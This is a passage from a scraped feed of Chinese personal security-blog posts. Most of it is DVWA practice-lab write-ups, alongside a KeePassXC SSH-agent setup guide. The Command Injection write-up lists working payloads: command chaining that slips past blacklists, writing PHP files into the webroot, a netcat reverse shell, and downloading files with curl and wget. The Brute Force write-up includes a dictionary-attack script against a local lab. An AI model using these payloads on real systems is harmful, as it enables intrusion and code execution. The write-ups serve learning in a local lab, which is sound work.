之类的洞攻破。这么一说就茅塞顿开了，虽然说是个练习靶场但也不是题目说CSRF就非要顶着CSRF死磕，别的洞一个不碰。（大佬说不定能死磕成功，我也想变大佬啊=。=）\n考虑多个漏洞联合利用确实常见也一定要学，但现在暂且还是免了吧=。=累死。后面捅 XSS 的时候再回头顺便把 Medium 难度做了。\n看了眼 High 难度下同样要结合多个漏洞利用，我寻思能突破 CORS 的话即使有 CSRF Token 也好办，直接 xhr 把表单页拿下来就好。\n总结 好的，现在 CSRF 感觉有点难利用了。主要还是现代浏览器的同源策略越来越严格，往默认安全靠拢，迭代速度快的一批。流传下来的利用方法如今一试就寄，半点屁用没有，连搭一个能复现漏洞的环境都麻烦的一批（比如具体哪个版本的 Chrome 修了SameSite，去哪儿下载历史版本，搞出一堆浏览器共存巴拉巴拉）\n然后就很难不想起互联网上不停重复的观点了。为什么不要做伸手党？抛开对大环境的影响，伸手党一直有个通病，就是没有学习的能力。这里的学习说的是 收集、整理、归纳、总结、利用 信息的能力。在一个领域独立探索未知，这是真正独立的标志。\n讲真，太怀念上学的日子了，脑子空空无忧无虑。真正出来工作卖力之后才会渐渐意识到什么叫不进则退。我觉得与其说什么社会在惩罚不努力的人，不如说这个社会在惩罚所有人。也不该说是社会，而是人的天性，让人生来就要受尽苦难。\n扯远了。就这样吧。\n","date":"2022-04-25T16:33:00+08:00","permalink":"https://nnnewb.github.io/blog/p/get-start-dvwa-03/","title":"DVWA上手记录-CSRF"},{"content":"前言 萌新试玩DVWA，Brute Force 和 Command Injection 两道入门题。\nBrute Force 信息收集 表单很简单，尝试随便给个用户名密码会报错。\n出于基本的好奇和联想（不要联想）试了下admin和password（就是DVWA默认的登陆密码），发现这就是正确密码了。\n好吧，猜出来也算。但题目是 Brute Force，所以本意应该是整一个暴力破解的脚本什么的吧，像是公网上天天扫 22 端口尝试弱密码的机器人一样。\n出于这样的想法，再看下表单怎么提交的，能不能直接写个脚本发 HTTP 请求搞定。\n再看下网络请求。\n用户名密码直接放在 QueryString 里，看起来也没什么保护，既然这样自己构造请求就很轻松愉快了。\n准备 暴力破解也有暴力破解的技巧。\n可接受的输入长度在有限区间的情况下，直接遍历所有字母数字特殊字符组合是很难顶的，每多一位可能的密码数量都是指数上升。比如最短 6 位密码，接受 ASCII 127 个字符，就有 127^6 种可能的密码，最长 16 位密码就是 127^16，每次尝试花费 1ms 的话，所需时间可以达到 1.44E+38 年这么久。\n但人不可能真的随机从ascii码表里随机抽取字符当密码，所以暴力破解其实只需要尝试比较常见的密码就行（比如生日、名字、单词、有规律的数字以及这些元素的组合），还可以选择从其他已泄露的网站里保存的用户名密码来“撞库”碰运气。\n这种“弱密码”构成的表在网上还是比较容易找到的。实在不行可以自己现编一个，比如直接英语词典、日期、常见姓名凑一凑，再找个 20xx 年 top N 弱密码合起来就是个可以一战的弱密码字典了。不过最好还是找个高质量的字典，好的字典排序能让暴力破密码更快（就是从统计（？）上来说越靠前的密码越常用，越可能是正确的密码）。\n挑好字典之后，剩下就是直接把这个字典从头到尾试一遍了。这里我随便找了个Weak-password（里面大部分内容不关心也用不到）直接下载 zip。\n创建个 dvwa-writeup 仓库用来存 dvwa 题解脚本，把 zip 解压进去。\n就是这样。\n编写脚本 出于个人偏好，使用 python 编写脚本。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31  #!/usr/bin/env python3 # # WriteUp: brute force [Security Level: Low] # Author: weak_ptr # # NOTE: require python version \u0026gt;= 3.6 # import requests dictionary_list = [ \u0026#39;Weak-password/Password dictionary/常用密码.dict\u0026#39;, \u0026#39;Weak-password/Password dictionary/国外常用密码.dict\u0026#39;, ] for path in dictionary_list: print(f\u0026#39;[+] open dict: {path}\u0026#39;) with open(path, \u0026#39;r\u0026#39;, encoding=\u0026#39;utf-8\u0026#39;) as f: for line in f: pwd = line.strip() resp = requests.get( f\u0026#39;http://localhost:8080/vulnerabilities/brute/?username=admin\u0026amp;password={pwd}\u0026amp;Login=Login#\u0026#39;, cookies={\u0026#39;PHPSESSID\u0026#39;: \u0026#39;t6kml64lvsbd8909fkrh51ove0\u0026#39;, \u0026#39;security\u0026#39;: \u0026#39;low\u0026#39;}) # 太粗暴 print(f\u0026#39;[-] try password: {pwd}\u0026#39;) if \u0026#39;Username and/or password incorrect.\u0026#39; not in resp.content.decode(\u0026#39;utf-8\u0026#39;): print(f\u0026#39;[+] Done! password is {repr(pwd)}\u0026#39;) break else: continue break   运行后：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21  [+] open dict: Weak-password/Password dictionary/常用密码.dict [-] try password: admin [-] try password: admin12 [-] try password: admin888 [-] try password: admin8 [-] try password: admin123 [-] try password: sysadmin [-] try password: adminxxx [-] try password: adminx [-] try password: 6kadmin [-] try password: base [-] try password: feitium [-] try password: admins [-] try password: root [-] try password: roots [-] try password: test [-] try password: test1 [-] try password: test123 [-] try password: test2 [-] try password: password [+] Done! password is \u0026#39;password\u0026#39;   值得注意的是不清楚是不是因为我跑在容器里而且虚拟机只分配了 2C 1G 的缘故，每次尝试密码耗时都接近 1s。放在真实场景下，服务端如果限制了请求频率（或者把每个请求都用固定时间返回，如 1s），破解成本会骤然提高（不过对服务器来说固定返回时间也是有不低的成本的）。\n提高难度 尝试把安全等级提高到 Medium 和 High 对暴力破解并没有什么用，不清楚是不是因为虚拟机太慢，单线程爆破没触发频率限制。但总之是和 Low 难度下没什么区别。\n提高到 Impossible ，开启 PHPIDS 也无济于事。\n可见系统设计再安全也顶不住人为因素，保险箱钥匙放在地毯下面的时候就算保险箱是振金做的也防不住贼啊。\nCommand Injection 信息收集 介绍是 ping a device，尝试输入 localhost 提交：\n应该是执行了 ping -c 4 \u0026lt;用户输入\u0026gt;。尝试随便输入什么东西会不会报错。\n立刻返回了，什么也没发生。再尝试拼一个命令进去：localhost \u0026amp;\u0026amp; echo 123\n注意到末尾输出了 123，说明存在命令执行。\n准备 能执行任意命令的话，悬念就不大了，进可攻退可守。\n对 /var/www/html 有写权限的话可以直接写个一句话木马，或者通过 nc 命令反弹 shell。\n顺便一体 nc 反弹 shell 我并不会（手动狗头）。所以还得先学一学怎么用 nc 反弹 shell，到底啥原理。\n先 man nc 看看手册。\n NAME\n​ nc - TCP/IP swiss army knife\nSYNOPSIS\n​ nc [-options] hostname port[s] [ports] \u0026hellip;\n​ nc -l -p port [-options] [hostname] [port]\n 嘶\u0026hellip;\u0026hellip;\nTCP/IP 瑞士军刀诶。\n netcat is a simple unix utility which reads and writes data across network connections, using TCP or UDP protocol. It is designed to be a reliable \u0026ldquo;back-end\u0026rdquo; tool that can be used directly or easily driven by other programs and scripts. At the same time, it is a feature-rich network debugging and exploration tool, since it can create almost any kind of connection you would need and has several interesting built-in capabilities. Netcat, or \u0026ldquo;nc\u0026rdquo; as the actual program is named, should have been supplied long ago as another one of those cryptic but standard Unix tools.\n netcat（我就管它叫网猫了），看介绍是一个可以被其他程序或者脚本驱动的“后端”工具，也是网络调试和探索工具，能创建几乎所有类型的连接。这么说感觉还有点迷惑，看后文介绍就清楚多了。\n In the simplest usage, \u0026ldquo;nc host port\u0026rdquo; creates a TCP connection to the given port on the given target host. Your standard input is then sent to the host, and anything that comes back across the connection is sent to your standard output. This continues indefinitely, until the network side of the connection shuts down. Note that this behavior is different from most other applications which shut everything down and exit after an end-of-file on the standard input.\nNetcat can also function as a server, by listening for inbound connections on arbitrary ports and then doing the same reading and writing. With minor limitations, netcat doesn\u0026rsquo;t really care if it runs in \u0026ldquo;client\u0026rdquo; or \u0026ldquo;server\u0026rdquo; mode \u0026ndash; it still shovels data back and forth until there isn\u0026rsquo;t any more left. In either mode, shutdown can be forced after a configurable time of inactivity on the network side.\n 概括下值得关注的部分，就是网猫的两种工作模式。客户端模式下把 stdin 用连接转发，同时把收到的消息写到 stdout；服务器模式监听端口，同样转发 stdin 并把收到的消息写到 stdout 。\n剩下比较重要的就是几个命令行选项：\n -l 指示网猫在服务器模式下工作，监听一个指定端口。 -e 指示网猫在连接后运行一个程序，程序的输入会变成从连接收到的信息，程序的输出会从连接发送出去。 -s 指示网猫监听的本地地址。  可以做个简单的实验熟悉下命令的使用，用 tmux 按 ctrl+b \u0026quot; ctrl+b % 切分两个窗口出来，一边执行 nc -l -s 0.0.0.0 -p 12345 另一边执行 nc localhost 12345。\n在执行 nc localhost 12345 的这边网猫工作在客户端模式下，可以自由尝试在两边键盘输入什么东西，另一边都会实时回显：\n现在解释网猫反向shell就很简单了，用 nc localhost 12345 -e /bin/sh 连接服务器，此时 /bin/sh 的输入输出被接管，我们在服务端输入 ls，客户端的 /bin/sh 读到的输入就是 ls，/bin/sh 执行 ls 的结果又返回到服务端——nc客户端就成了一个类似sshd的角色，故称反向连接。\n构造 payload 先尝试用网猫反向连接。输入内容改成 localhost \u0026amp;\u0026amp; nc \u0026lt;ip\u0026gt; \u0026lt;port\u0026gt; -e /bin/sh \u0026amp; ，等待连接。\n没成功。网页显示 ping 命令的输出，看了眼 dvwa 容器的日志发现提示没有nc命令。\n好吧，上面那么多话到最后还是没有屁用。那就改成提交一个 php 一句话。输入内容改为 localhost \u0026amp;\u0026amp; echo '\u0026lt;?php phpinfo(); ?\u0026gt;' \u0026gt; /var/www/html/1.php，然后访问 http://localhost:8080/1.php，发现成功显示 phpinfo，done。\n提高难度：Medium 在 Medium 难度下 直接注入 localhost \u0026amp;\u0026amp; echo 123 会发现没有 123 回显了，日志里出现 ping: unknown host 的错误，初步怀疑是对 \u0026amp;\u0026amp; 做了过滤。\nDVWA 是个白盒，我也不用瞎试，直接点开 view source 审计下代码。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30  \u0026lt;?php if( isset( $_POST[ \u0026#39;Submit\u0026#39; ] ) ) { // Get input  $target = $_REQUEST[ \u0026#39;ip\u0026#39; ]; // Set blacklist  $substitutions = array( \u0026#39;\u0026amp;\u0026amp;\u0026#39; =\u0026gt; \u0026#39;\u0026#39;, \u0026#39;;\u0026#39; =\u0026gt; \u0026#39;\u0026#39;, ); // Remove any of the charactars in the array (blacklist).  $target = str_replace( array_keys( $substitutions ), $substitutions, $target ); // Determine OS and execute the ping command.  if( stristr( php_uname( \u0026#39;s\u0026#39; ), \u0026#39;Windows NT\u0026#39; ) ) { // Windows  $cmd = shell_exec( \u0026#39;ping \u0026#39; . $target ); } else { // *nix  $cmd = shell_exec( \u0026#39;ping -c 4 \u0026#39; . $target ); } // Feedback for the end user  echo \u0026#34;\u0026lt;pre\u0026gt;{$cmd}\u0026lt;/pre\u0026gt;\u0026#34;; } ?\u0026gt;  注意到把 \u0026amp;\u0026amp; 和 ; 去除了，但这个过滤显然是不完善的。起码我一下子就能想到还可以||或者|，还有$()之类的方式。\n把先前的 payload 改成 notexists || echo 123 再提交。\n可以看到 echo 123 已经被执行了，剩下的就是 get shell 了。\n提高难度：High High 难度下用 Medium 难度的 Payload 也能直接 bypass，有点意外。虽然已经过了，但还是再审计下 High 难度下的代码，看看和 Medium 难度有什么不同。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37  \u0026lt;?php if( isset( $_POST[ \u0026#39;Submit\u0026#39; ] ) ) { // Get input  $target = trim($_REQUEST[ \u0026#39;ip\u0026#39; ]); // Set blacklist  $substitutions = array( \u0026#39;\u0026amp;\u0026#39; =\u0026gt; \u0026#39;\u0026#39;, \u0026#39;;\u0026#39; =\u0026gt; \u0026#39;\u0026#39;, \u0026#39;| \u0026#39; =\u0026gt; \u0026#39;\u0026#39;, \u0026#39;-\u0026#39; =\u0026gt; \u0026#39;\u0026#39;, \u0026#39;$\u0026#39; =\u0026gt; \u0026#39;\u0026#39;, \u0026#39;(\u0026#39; =\u0026gt; \u0026#39;\u0026#39;, \u0026#39;)\u0026#39; =\u0026gt; \u0026#39;\u0026#39;, \u0026#39;`\u0026#39; =\u0026gt; \u0026#39;\u0026#39;, \u0026#39;||\u0026#39; =\u0026gt; \u0026#39;\u0026#39;, ); // Remove any of the charactars in the array (blacklist).  $target = str_replace( array_keys( $substitutions ), $substitutions, $target ); // Determine OS and execute the ping command.  if( stristr( php_uname( \u0026#39;s\u0026#39; ), \u0026#39;Windows NT\u0026#39; ) ) { // Windows  $cmd = shell_exec( \u0026#39;ping \u0026#39; . $target ); } else { // *nix  $cmd = shell_exec( \u0026#39;ping -c 4 \u0026#39; . $target ); } // Feedback for the end user  echo \u0026#34;\u0026lt;pre\u0026gt;{$cmd}\u0026lt;/pre\u0026gt;\u0026#34;; } ?\u0026gt;  王德发？\n这不是已经滤掉了 || 吗，为什么 notexists || echo 123 这个 payload 还是显示了 123？\n我不理解，大受震撼。干脆开了个 php 解释器试一试 str_replace 到底替换出来个什么鬼。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22  \u0026lt;?php // Get input  $target = \u0026#39;notexists || echo 123\u0026#39;; // Set blacklist  $substitutions = array( \u0026#39;\u0026amp;\u0026#39; =\u0026gt; \u0026#39;\u0026#39;, \u0026#39;;\u0026#39; =\u0026gt; \u0026#39;\u0026#39;, \u0026#39;| \u0026#39; =\u0026gt; \u0026#39;\u0026#39;, \u0026#39;-\u0026#39; =\u0026gt; \u0026#39;\u0026#39;, \u0026#39;$\u0026#39; =\u0026gt; \u0026#39;\u0026#39;, \u0026#39;(\u0026#39; =\u0026gt; \u0026#39;\u0026#39;, \u0026#39;)\u0026#39; =\u0026gt; \u0026#39;\u0026#39;, \u0026#39;`\u0026#39; =\u0026gt; \u0026#39;\u0026#39;, \u0026#39;||\u0026#39; =\u0026gt; \u0026#39;\u0026#39;, ); // Remove any of the charactars in the array (blacklist).  $target = str_replace( array_keys( $substitutions ), $substitutions, $target ); echo \u0026#39;ping -c 4 \u0026#39; . $target ?\u0026gt;  结果是ping -c 4 notexists |echo 123。看起来是 str_replace 的用法有误，导致实际替换掉的是 | 而不是 ||。\nphp 官方文档（8.1）如是说：\n If search and replace are arrays, then str_replace() takes a value from each array and uses them to search and replace on subject. If replace has fewer values than search, then an empty string is used for the rest of replacement values. If search is an array and replace is a string, then this replacement string is used for every value of search. The converse would not make sense, though.\n DVWA 容器的 PHP 版本是 7.0 ，姑且当没变。那问题就在于 str_replace 的替换方法了，我猜\u0026hellip;\u0026hellip;当 search 是 array 的时候，str_replace 实际是这样干的：\n1 2 3  for _, pattern := range search { subject = replace(pattern, subject) }   简单实验验证下。\n1 2  \u0026lt;?php echo str_replace(array(\u0026#34;a\u0026#34;,\u0026#34;ab\u0026#34;),\u0026#34;c\u0026#34;,\u0026#34;aabbcc\u0026#34;); // ccbbcc   但即使如此，也应该替换掉 || 两个字符才对啊\u0026hellip;\n最后才发现，替换的模式是 | （在|后面多一个空格），所以只替换掉了 || 的后一个 | \u0026hellip;\u0026hellip;\n事实证明视力还是很重要的，少打sc2，没瞎早该看到了。\n据此可以再改一改 payload，已知 ||会被替换成 |，管道运算符会把上一个命令的输出接到下一个命令的 stdin 输入。正好，echo 不读 stdin，直接echo '\u0026lt;?php phpinfo(); ?\u0026gt;' \u0026gt; /var/www/html/1.php 的方法应该不受影响。\n倒是没报 404，可是白屏了。从 DVWA 的日志观察到下面的记录：\n1  [Fri Apr 22 08:07:20.601596 2022] [:error] [pid 312] [client 10.0.2.2:51105] PHP Notice: Use of undefined constant phpinfo - assumed \u0026#39;phpinfo\u0026#39; in /var/www/html/2.php on line 1   这倒是很新鲜，phpinfo不应该是全局的吗？\n 我又傻逼了。\n 经过十几分钟的脑残式思考，忽然意识到 ( 和 ) 也在过滤清单里，哦淦！好吧，直接在这里注入 php 代码看来限制有点太多了，插个curl命令让它下载得了。\n本地用 python3 -m http.server命令启动一个 http 服务器，然后 ip addr show docker0 看一眼本机 ip，把 payload 改成 notexists || curl http://172.17.0.1:8000/2.php -O /var/www/html/2.php ，先找个 playground 试一试过滤后的命令是什么样。\nping -c 4 notexists |curl http://172.17.0.1:8000/2.php O /var/www/html/2.php\n发现 - 也被过滤了，-O参数不能用。想到看看 php 默认运行目录是哪里，直接 wget 下载到当前目录也可以。然后又想到可以再拼一个 || mv 2.php /var/www/html/2.php 移动过去。再试一试。\nping -c 4 notexists |wget http://172.17.0.1:8000/2.php |mv 2.php /var/www/html/2.php\n现在看起来有机会运行了，结果报错wget: not found。\n行吧。乖乖curl，payload 改成 notexists || curl http://172.17.0.1:8000/2.php || tee /var/www/html/2.php。更屑的事情发生了：curl: not found。\n怎么什么都没有？沃日。拼一句 || ls /usr/bin看看有啥可以用的，惊喜地发现居然有个 rsync，这下总该省事了吧，结果半天没搞出来匿名访问的 rsync daemon。\n一看时间快下班了，突然意识到其实有 base64 可以用=。=，还有printf转义\\x 都能bypass。怎么一到下班时间就才思泉涌。\npayload 改成 notexists || printf '\u0026lt;?php phpinfo\\x28\\x29\\x3b ?\u0026gt;' \u0026gt; /var/www/html/2.php，结果发现依然不行。为什么？头都要炸了。base64 -d的-会被过滤故不能考虑，printf的\\x转义序列怎么会不行，谷歌了一番在爆栈看到个回答：\n Because escape sequences in \\xdd form (where each d represents a hexadecimal digit) are a GNU extension and not available everywhere. But octals are widely supported (and standardized), so you can use:\n1  printf \u0026#39;%b\u0026#39; \u0026#39;\\0220\u0026#39;    好嘛，所以说 \\x 转义序列还不够 portable 是吧。\\0转义序列要用 8 进制编码，于是我再次改了一下 payload \u0026hellip;\nnotexists|printf '\u0026lt;?php phpinfo\\050\\051\\073 ?\u0026gt;' \u0026gt; /var/www/html/2.php，把 \\x 转义序列改成了 \\0，这次没问题了。\n此外还想到另一种解法，考虑sh（csh或者dash，ash？）不吃\\x，要是对\\0也不吃还有种比较狗的办法，printf \u0026quot;printf \\\u0026quot;\\\\x28\\\\x29\\\u0026quot;\u0026quot;|bash，用\\\\转义留下反斜杠，然后传给bash执行。bash大概率是能吃下\\x转义序列的，于是就间接实现了printf \\x28\\x29。\n传notexists|printf \u0026quot;printf \\\u0026quot;\\\\x28\\\u0026quot;\u0026quot;|bash这个 payload 可以看到回显 (，说明这个思路是 ok 的。\n总结 Brute Force 比较简单，不提。\nCommand Injection 其实一直到 High 难度都还是比较简单的，High 难度下留了|管道符可以用，整个注入就没啥难度了。\n这就让我想到了怎么写 ping 这个案例才能做到杜绝命令注入？\n\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}正则匹配一下，感觉上面玩的那些花样就毫无意义了。\nImpossible 难度下 Command Injection 变成了这样\n1 2 3 4 5 6 7 8 9 10 11 12  // Get input  $target = $_REQUEST[ \u0026#39;ip\u0026#39; ]; $target = stripslashes( $target ); // Split the IP into 4 octects  $octet = explode( \u0026#34;.\u0026#34;, $target ); // Check IF each octet is an integer  if( ( is_numeric( $octet[0] ) ) \u0026amp;\u0026amp; ( is_numeric( $octet[1] ) ) \u0026amp;\u0026amp; ( is_numeric( $octet[2] ) ) \u0026amp;\u0026amp; ( is_numeric( $octet[3] ) ) \u0026amp;\u0026amp; ( sizeof( $octet ) == 4 ) ) { // If all 4 octets are int\u0026#39;s put the IP back together.  $target = $octet[0] . \u0026#39;.\u0026#39; . $octet[1] . \u0026#39;.\u0026#39; . $octet[2] . \u0026#39;.\u0026#39; . $octet[3]; //...   我是有点难理解为什么还是用这种比较糙的手段验证=。=正则匹配下不行吗？is_numeric是不是能 bypass 我不太肯定，但这条长长的if看起来就感觉是有坑的样子\u0026hellip;\n所以吧\u0026hellip;到底多少还有点迷惑。Impossible 难度的命令注入，未来再研究研究，也许之后会再写篇博客看看。\n","date":"2022-04-24T15:05:00+08:00","permalink":"https://nnnewb.github.io/blog/p/get-start-dvwa-02/","title":"DVWA上手记录-简单尝试"},{"content":"前言 DVWA 全程 Damn Vunerable Web Application ，是一个开源的基于 PHP+MariaDB 开发的漏洞靶场。\n官方文档推荐XAMPP部署，但个人比较爱docker，先拿 README 里写的 vulnerables/web-dvwa 玩玩看。\n vulnerable/web-dvwa 这个容器最后一次更新已经是 2015 年了，作为纯萌新姑且先把玩看看，安全领域攻防发展这么快，我寻思这个版本是有点和时代脱节了。\n 安装 启动个虚拟机，debian bullseye，装好 docker 再配好 zsh 之类的工具。tmux 开个分窗然后一键跑起来：docker run --rm -it -p 80:80 vulerables/web-dvwa。\n配置下虚拟机端口转发，把 SSH 和 HTTP 转发到宿主机：\n最后在浏览器打开 http://localhost:8080/ 就能看到登录页了。在创建数据库前随便输入什么用户名密码都能进去，简单读一下/setup.php 上写的内容，点一下 Create/Reset database。\n等跳转回登录页，就算是完成了。\n默认账号密码是 admin 和 password 。\n信息收集 介绍 在侧边栏可以看到可用的模块。\n具体内容稍后再看，先把主页上的信息读一读。\n介绍中这样说：\n It is up to the user how they approach DVWA. Either by working through every module at a fixed level, or selecting any module and working up to reach the highest level they can before moving onto the next one. There is not a fixed object to complete a module; however users should feel that they have successfully exploited the system as best as they possible could by using that particular vulnerability.\n 用户自己决定怎么玩这个靶场，没有固定目标。可以先把一个模块从低难度到高难度全打通再继续下一个，也可以低难度把所有模块打通再提高难度再来一轮。\n Please note, there are both documented and undocumented vulnerability with this software. This is intentional. You are encouraged to try and discover as many issues as possible.\n 并且还提到有意存在未文档化的漏洞，也就是攻破一个模块的方法并不局限于帮助文档里的方法，完全可能自己挖掘出别的问题。\n DVWA also includes a Web Application Firewall (WAF), PHPIDS, which can be enabled at any stage to further increase the difficulty.\n DVWA 还包含了 WAF，可以自己开启或者关闭。开启等于是给自己提高了难度。\nPHP info 侧边栏下方有个 PHP Info 链接，点开看一眼，就是个经典的 phpinfo 页。\nphp 版本是 7.0.30-0+deb9u1，应该是 debian 打包的版本。\nApache 版本 2.4.25，Debian 打包的版本。\n其他半懂不懂的全部略，就当没看见。\n之后有需要再来看。\n关于 在 About 页里提到发行时间是 2015-10-08，确实很老了。\n里面还有些相关链接和资源、文档，把 dvwa 的官网主页加入收藏夹后剩下的内容暂且不管。\nDVWA security 安全配置页，显示当前的 DVWA 运行在哪个安全级别（就是前文介绍中提到的 难度）。\n注意到页面这几个位置都有标注当前安全配置，在这个页面可以修改安全级别和 WAF （图中 PHPIDS）的开启状态。\nSetup/Reset DB 这个页面就是最初启动 DVWA 的时候初始化数据库的页面，可以在这个页面里重置数据库，也能在这个页面看到一些自检信息。\nallow_url_include暂时不管，等玩到那个模块的时候再看情况。\nreCAPTCHA key 是验证码模块需要的，等玩到的时候再找下怎么配。\n最下面的 Create / Reset Database 的按钮就是重置数据库了。对于用 docker --rm 启动的我来说直接重启下容器清理地更干净，预计不会怎么用到这个功能。\n模块速览 Brute Force 一般说 Brute Force 的时候就是暴力破解了，”跑字典“啊什么的。遍历可能存在的的弱密码。\nCommand Injection 命令注入，相当经典的一个 ping，应该看一眼就知道指的什么了。\nCSRF 跨站请求伪造，有点摸不着头脑。emm，难道是说这个页面没有考虑 csrf （可能还有cors？），所以能在别的站直接发个 xhr 实现修改密码？\nFile Inclusion 没思路。虽然看过 p 大博客信手拈来的文件包含利用，但对着这个页面暂时还是想不出要干啥。\n PS：刚发现地址栏有点意思\n File Upload 可能是任意文件上传相关的洞？\nInsecure CAPTCHA 看标题还是有点意思的，不安全的验证码指的是可以绕过验证码么？\nSQL Injection 经典SQL注入。\nSQL Injection (Blind) 和上面一样，不过是盲注。\nWeak Session IDs 对 PHP 还不够了解，不知道 Weak Session IDs 指的是什么。可能和 Cookie 里的 PHPSESSID 有关系？\nXSS (DOM) 见下。\nXSS(Reflected) 见下。\nXSS(Stored) 三类 XSS ，页面分别如下。\n除了 DOM 型看页面没有思路，另外两个看注入点还是清楚的。\nCSP Bypass 不了解 CSP，没头绪。\nJavaScript 有点摸不着头脑，指的是在前端用 JS 检查表单不安全？\n看链接里的 es6-proxies-in-depth 感觉是个绕过前端保护的题。\n初体验总结 姑且算是把 DVWA 这个靶场在手里把玩了一下，初步看了看怎么玩、有什么可玩。\n接下来考虑是一题一题难度从低到高慢慢刷过去，实在干不过再跳。\n","date":"2022-04-21T16:41:00+08:00","permalink":"https://nnnewb.github.io/blog/p/get-start-dvwa-01/","title":"DVWA上手记录-初体验"},{"content":"前言 突发奇想，先前一直把密码存在 keepassxc 里，但 SSH 秘钥是存在 keepassxc 的备注里，用的时候还得先复制出来建个文件，虽然只用折腾一次但还是嫌麻烦。\n于是想到 keepassxc 自带 SSH 集成，于是研究了下怎么用 SSH 集成在 keepassxc 里保存秘钥对，省掉复制出秘钥内容到文件里的过程，还更安全。\n过程 平台和选型 首先确定 keepassxc 和 ssh 运行的平台，keepassxc 本体是支持 Windows/MacOS/Linux 三端的，ssh 在Windows上倒是有几种不同的选型。\n在 Windows 10 Build 1809 版本之后，Windows 已经内置了 OpenSSH 软件，还在用 PuTTY 的可以省掉 PuTTY 了。\n旧点的 Windows 可以选择 PuTTY 或者装一个基于 MinGW 的 OpenSSH，如 Git-SCM 自带的 OpenSSH 或者 MSYS2、MinGW64 一类。\n原理 keepassxc 的 ssh 集成本质是主动往 ssh-agent 添加秘钥，ssh 命令从 ssh-agent 读到秘钥，尝试用秘钥连接服务器。表现出的效果就是和直接把秘钥放在 .ssh/id_rsa 也没什么区别。\nkeepassxc 还支持解锁自动添加和锁定时自动删除，还有超时自动删除，安全性会稍再好一点，可惜 Windows 自带的 OpenSSH 不支持使用秘钥时给用户确认（见 issue #1056），导致开启 keepassxc 的确认功能时会添加秘钥失败。\n至于 ssh-agent 的原理就略过不提了，可以理解成一个秘钥代理，ssh 自动问 ssh-agent 有什么秘钥可用，就像保管钥匙的管家。\n配置 OpenSSH 参考 keepassxc 的文档，先启动 Windows 自带的 OpenSSH 的 ssh-agent 服务。\n1 2  PS C:\\Users\\user\u0026gt; Get-Service ssh-agent | Set-Service -StartupType Automatic PS C:\\Users\\user\u0026gt; Start-Service ssh-agent   注意上面的命令需要 管理员权限 运行。\n就是这样！\n配置 keepassxc 之后在 keepassxc 里打开 ssh 集成，选中 OpenSSH 作为代理。\n然后添加一个常规的密码记录，在高级里添加秘钥文件，并在 SSH 里启用：\n注意勾选 Add key to agent when database is opened/unlocked 和 Remove key from agent when database is closed/locked，这两个选项会让 keepassxc 解锁的情况下自动在后台添加 SSH 秘钥到 ssh-agent，同时当你关闭 keepassxc 之后 SSH 就无法再从 ssh-agent 拿到秘钥，体验会更自然。\n如果不勾选这两个选项，也可以手动在设置了 SSH 代理的项目上右击添加到 ssh-agent。\n这种方式添加到 ssh-agent 的秘钥不会自动从 ssh-agent 删除或自动添加，每次重启都要自己右键添加，比较麻烦。\n检查 如何确认配置正确无误？\n可以通过几个方面：\n 在设置-SSH代理界面，顶部有个绿条，提示 ”SSH代理连接工作正常！“ 在命令行运行ssh-add -l，会列出你刚添加的秘钥。 尝试ssh连接你的服务器，公钥登陆成功。  如果 “SSH 代理连接工作正常” 没出现的话可能是 ssh-agent 服务没启动或者有问题，可以 stop-service ssh-agent 停止 ssh-agent 这个系统服务后再在命令行运行 ssh-agent -d，输出调试日志，看看具体什么问题。\n如果ssh-add -l没有输出，也是一样，检查ssh-agent是否在运行，如果在运行但依然没有，用-d参数启动 ssh-agent 看看添加秘钥的步骤有什么问题。\n如果 ssh-add -l 有输出了，但 ssh 连接依然问你要密码，有两种可能：\n 你的 ssh 秘钥有密码保护，一般是 ssh-keygen 的时候设置的。 秘钥被拒绝了。  有密码保护的秘钥 ssh 命令有提示，注意看 ssh 命令的输出就行。秘钥被拒绝的情况表面很难看出来，可以用 -vvv 参数再运行 ssh 命令，看命令输出。\n如果 will attempt key 没有出现 ssh-add -l 列出的秘钥，还可能是因为 .ssh/config 里，给你要连接的 Host 设置了 IdentitiesOnly yes。这个设置项会强制 ssh 只使用本地的 .ssh/id_rsa 等私钥文件。\n另外 .ssh/config 里可能还指定了别的验证方式也会导致不使用公钥，这就要靠自己检查 .ssh/config 来排错了。\n配置 Git Windows 下还有个坑，在提交博客的时候才发现。 Git-SCM 默认使用的 SSH 命令不是 Windows 自带的 OpenSSH。这会导致 Git 在推送的时候不使用我们添加到 ssh-agent （Windows 自带的 OpenSSH 版 ssh-agent）的秘钥，而是用 Git-SCM 自带的 MinGW 版 OpenSSH，造成推送时提示 Permission Denied (publickey) 。\n解决办法也很简单，git config --global core.SshCommand \u0026quot;C:/Windows/System32/OpenSSH/ssh.exe\u0026quot; 把 Windows 自带的 OpenSSH 设置成 Git 默认使用的 ssh 即可。需要注意 这里的路径用正斜杠/分隔，不要用反斜杠\\ 。\n总结 总的来说用 ssh-agent 配合 keepassxc 玩 ssh 还是很舒服的，特别是迁移起来的时候，只要同步和备份 keepassxc 的数据库就完事。\nkeepassxc 的附加文件也非常适合把 GPG 之类的秘钥备份起来，换工作机或者自己电脑重装迁移的时候都能省不少心思。\n","date":"2022-04-21T10:27:00+08:00","permalink":"https://nnnewb.github.io/blog/p/keepassxc-ssh-integration/","title":"尝鲜keepassxc的ssh集成"},{"content":"前言 迫不及待要找个靶场实践了，抓紧把剩下的两种概念捋一捋。\n任意文件上传 上传漏洞本质是\n 可以上传任意类型文件 可以远程执行或利用被上传的文件发起进一步攻击  缺一不可。\n能上传不能利用的情况：\n举例来说，业务代码里没检查上传文件的 mimetype，你传了一个包含恶意代码的文件I_am_hacker_hahaha.php上传到了服务器上，但服务端是一个独立 Go 程序，没有 httpd也没有nginx，那任你传什么恶意脚本都没用——根本不会去执行你的代码。\n能利用但没法上传的情况：\n比如过滤很完善，会检查文件头的 Magic 之类的。还有一种是服务端用了对象存储服务。阿里云 OSS ，腾讯云 OSS，七牛云。虽然服务器配的是 httpd+php 